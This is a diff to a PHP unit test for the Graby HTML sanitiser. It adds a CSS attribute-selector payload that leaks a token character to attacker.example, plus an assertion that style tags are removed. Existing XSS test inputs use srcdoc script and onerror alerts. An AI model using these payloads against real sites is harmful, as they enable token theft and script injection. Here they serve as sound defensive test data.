@@ -1237,6 +1237,7 @@ class GrabyTest extends TestCase
     {
         $graby = new Graby();
         $html = '<article>'
+            . '<style>input[name=token][value^=a]{background:url(//attacker.example/token)}</style>'
             . '<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">overlay</div>'
             . '<iframe src="https://example.com/embed" srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>'
             . '<img src="x" onerror="alert(1)" />'
@@ -1247,6 +1248,7 @@ class GrabyTest extends TestCase
         $this->assertStringContainsString('<div>overlay</div>', $cleanedHtml);
         $this->assertStringContainsString('<iframe src="https://example.com/embed"></iframe>', $cleanedHtml);
         $this->assertStringContainsString('<img src="x" alt="image" />', $cleanedHtml);
+        $this->assertStringNotContainsString('<style', $cleanedHtml);
         $this->assertStringNotContainsString('style=', $cleanedHtml);
         $this->assertStringNotContainsString('srcdoc=', $cleanedHtml);
         $this->assertStringNotContainsString('onerror=', $cleanedHtml);
